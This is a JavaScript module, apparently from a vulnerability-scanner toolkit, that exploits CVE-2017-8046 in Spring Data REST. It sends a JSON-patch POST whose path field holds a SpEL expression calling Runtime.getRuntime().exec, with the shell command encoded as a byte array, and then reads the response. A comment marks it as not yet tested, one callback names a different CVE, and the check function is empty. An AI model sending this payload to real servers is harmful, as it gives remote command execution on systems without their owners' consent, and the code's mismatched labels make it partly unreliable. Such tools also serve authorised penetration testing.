// 还没有成功测试
module.exports={
	tags: "spring,CVE-2017-8046,8046,web",
	des: "Spring-Data-REST-RCE 【CVE-2017-8046】",
	dependencies:"java,ysoserial,base64,tr",
	VulApps:[
		"https://blog.spoock.com/2018/05/22/cve-2017-8046/"
	],
	urls:[
		"https://blog.spoock.com/2018/05/22/cve-2017-8046/"
		
	],
	fnMakePayload:function(szCmd)
	{
		var x = szCmd.split(""), szT = "";
		for(var i = 0; i < x.length; i++)
		{
			if(0 < i)szT += ",";
			szT += x[i].charCodeAt(0);
		}
		return szT
	},
	fnSendPayload:function(url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var szOldUrl = url;
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,
			data:'[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{' + _t.fnMakePayload("id;w") + '}))/lastName", "value": "vulhub" }]'
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa,
		    	"Content-Type":'application/json-patch+json'
		    }})
		  ,function (error, response, body)
		  {
		  	body = String(body);
		  	_s.fnShowBody(body);
	  		if(body)
	  		{
	  			body = _s.fnCheckVul1(String(body));
	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
	  			// console.log(url + "\n"+body);
	  			_s.fnDoBody(body,"cve-2017-4971",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":_s.g_postData};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	  		}
		  }
		);
	},
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this,_s = _t.self;
		var szOldUrl = url;
	}
};